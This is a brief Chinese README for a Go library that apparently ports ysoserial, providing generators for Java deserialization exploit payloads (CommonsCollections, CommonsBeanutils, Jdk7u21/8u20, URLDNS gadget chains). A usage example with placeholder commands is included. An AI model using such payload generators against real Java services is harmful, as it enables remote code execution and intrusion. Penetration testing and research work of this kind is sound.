
当用GO写JAVA反序列化EXP的时候, 每次都要重写生成,调用不方便时, 可以使用本库

使用方法示例
```go
package main

import (
	"encoding/hex"
	"fmt"

	"github.com/nu1r/GlangYsoserial"
)

func main() {
	fmt.Println(hex.Dump(GlangYsoserial.URLDNS("example domain")))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsBeanutils1([]byte("example bytes"))))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections1("example command")))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections2([]byte("example bytes"))))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections3([]byte("example bytes"))))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections4([]byte("example bytes"))))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections5("example command")))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections6("example command")))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections7("example command")))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections8([]byte("example bytes"))))
	fmt.Println(hex.Dump(GlangYsoserial.CommonsCollections9("example command")))
	fmt.Println(hex.Dump(GlangYsoserial.Jdk7u21([]byte("example bytes"))))
	fmt.Println(hex.Dump(GlangYsoserial.Jdk8u20([]byte("example bytes"))))
}

```
